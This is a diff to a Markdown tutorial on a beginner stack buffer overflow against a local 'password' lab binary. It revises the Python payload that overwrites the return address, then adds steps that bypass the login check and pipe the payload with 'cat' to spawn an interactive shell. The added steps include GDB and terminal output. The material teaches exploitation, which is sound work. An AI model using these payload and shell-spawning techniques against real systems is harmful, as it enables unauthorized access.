@@ -333,16 +333,16 @@ Dump of assembler code for function correct:
 End of assembler dump.
 ```
 
-As we can see in the assembler dump above, `0x0000555555555175` is the address of the first line of code in `correct()`, so all we need to do now is change the return address to `0x0000555555555175`. This can be done with the following python code:
+As we can see in the assembler dump above, `0x0000555555555175` is the address of the first line of code in `correct()`, so all we need to do now is change the return address to `0x0000555555555175`. Let's use the following python code to modify the return address. (Note that the address will probably be different on your computer, so don't run this next line of code without first changing the address to be the one you found on your computer.)
 
 ```sh
-$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x75\x51\x55\x55\x55\x55')" > test
+$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x75\x51\x55\x55\x55\x55\x00\x00')" > test
 ```
 
 Note that we must convert the big-endian value `0x0000555555555175` into its little-endian equivalent when we use this command. When we run the program inside GDB using the test file as input, we can actually see that we're jumping into the `correct()` function when the `ret` instruction is executed. We can use the `break` or `b` command to setup a breakpoint, which will allow us to pause the program and see what's going on.
 
 ```sh
-$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x75\x51\x55\x55\x55\x55')" > test
+$ python3 -c "import sys; sys.stdout.buffer.write(b'A'*24 + b'\x75\x51\x55\x55\x55\x55\x00\x00')" > test
 
 $ gdb password
 GNU gdb (Debian 10.1-1.4) 10.1
@@ -433,9 +433,32 @@ You entered in the correct password!
 [Detaching vfork parent process 3124 after child exec]
 [Inferior 1 (process 3124) detached]
 process 3132 is executing new program: /usr/bin/dash
+[...]
 ```
 
-Congratulations! You have successfully conducted a buffer overflow that allowed you to bypass the login system for this binary!
+GDB can sometimes be a little bit glitchy when it comes to spawning shells, so we're unable to type commands to the program even though the call to `system("/bin/sh")` was successful. Let's try running this code outside of GDB.
+
+```sh
+$ ./password < test
+Enter the password: Invalid password.
+You entered in the correct password!
+zsh: segmentation fault  ./password < test
+```
+
+We're still unable to spawn a shell from this. The reason that no shell is being spawned is because we have used the input redirector to redirect input for `STDIN` to come from the test file instead of from the keyboard. We can use a little trick with the `cat` command to get around this annoying situation.
+
+```sh
+$ (cat test; cat) | ./password
+
+Enter the password: Invalid password.
+You entered in the correct password!
+ls
+password  password.c  README.md  test
+echo "Wow the buffer overflow worked!!!"
+Wow the buffer overflow worked!!!
+```
+
+Congratulations! You have successfully conducted your first buffer overflow! Not only were you able to bypass the login system for this program, but you were also able to spawn a shell that gave you complete control over the system!
 
 ## Practice:
 - TODO: Get a TCTF challenge here.
